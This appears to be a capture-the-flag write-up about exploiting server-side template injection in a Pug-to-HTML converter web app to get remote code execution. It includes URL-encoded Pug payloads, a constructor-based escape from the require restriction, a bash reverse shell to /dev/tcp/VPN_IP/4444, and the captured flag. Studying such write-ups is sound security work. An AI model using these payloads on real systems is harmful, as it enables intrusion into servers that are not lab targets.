# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 5000 | HTTP |



# RECONNAISSANCE
---

Let's check the website out:


![Pasted image 20250606121148.png](../../IMAGES/Pasted%20image%2020250606121148.png)

We are dealing with something called `PUG to HTML Converter`, **Pug** (formerly called Jade) is a server-side templating engine for Node.js that uses indentation and terse syntax to generate HTML. Under the hood, Pug compiles these templates into JavaScript functions that build an HTML string. Any interpolation tags, like `#{¦}` (escaped) or `!{¦}` (unescaped), are evaluated as JavaScript expressions at render time.

Let's check an exploit for this: 

![Pasted image 20250606121717.png](../../IMAGES/Pasted%20image%2020250606121717.png)

We got RCE via SSTI, let's proceed to exploitation.

# EXPLOITATION
---


First of all, we should send the request to our proxy, I'll be using Caido:

![Pasted image 20250606121819.png](../../IMAGES/Pasted%20image%2020250606121819.png)

As seen, we got a `template` parameter, let's try doing the SSTI:

```
template=doctype+html%0Ahead%0A++title+Test%0Ah1+Result%3A+%23%7B7*7%7D
```

![Pasted image 20250606122035.png](../../IMAGES/Pasted%20image%2020250606122035.png)


As seen, we get:

```html
<pre>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;h1&gt;Result: 49&lt;/h1&gt;</pre>
```


That means `7*7` is being evaluated so, SSTI works, let's try reading more files and even attempt the RCE, let's try using the `require` function:

```js
template=h1+%23%7Brequire%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%7D
```


![Pasted image 20250606122552.png](../../IMAGES/Pasted%20image%2020250606122552.png)

Require seems to be disabled on here, we can do a little trick with the `constructor` function:

```js
template=h1+%23%7Bthis.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%7D
```

![Pasted image 20250606122635.png](../../IMAGES/Pasted%20image%2020250606122635.png)

There we go, `rce` works, let's send ourselves a reverse shell now:

```js
template=h1+%23%7Bthis.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%27child_process%27%29.execSync%28%22bash+-c+%27bash+-i+%3E%26+/dev/tcp/VPN_IP/4444+0%3E%261%27%22%29%7D
```

![Pasted image 20250606122827.png](../../IMAGES/Pasted%20image%2020250606122827.png)

Nice, we got our shell, no need to perform privilege escalation, we can simply read our flag:

```
find / -type f -name "flag.txt" 2>/dev/null\
/usr/src/app/flag.txt

user@774c7a0d6226:/tmp$ cat /usr/src/app/flag.txt
flag{3cfca66f3611059a0dfbc4191a0803b2}
```

![Pasted image 20250606123957.png](../../IMAGES/Pasted%20image%2020250606123957.png)

